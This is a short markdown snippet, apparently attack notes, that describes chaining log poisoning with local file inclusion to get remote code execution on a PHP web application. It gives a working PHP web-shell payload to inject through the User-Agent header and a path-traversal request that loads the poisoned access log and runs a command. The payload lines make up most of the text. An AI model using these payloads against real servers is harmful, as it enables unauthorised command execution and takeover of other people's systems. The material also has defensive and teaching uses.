
<details>

<img width="724" height="810" alt="image" src="https://github.com/user-attachments/assets/538dd101-f929-4870-9b06-25603c8ae869" />


```
Server Log Injection + LFI → RCE

 App logs user input (e.g. User-Agent) to a file
 Attacker injects PHP code

User-Agent: <?php system($_GET['cmd']); ?>

 Log file stored in web root: /logs/access.log
 If LFI exists
/index?page=../../logs/access.log&cmd=id
```


  
</details>
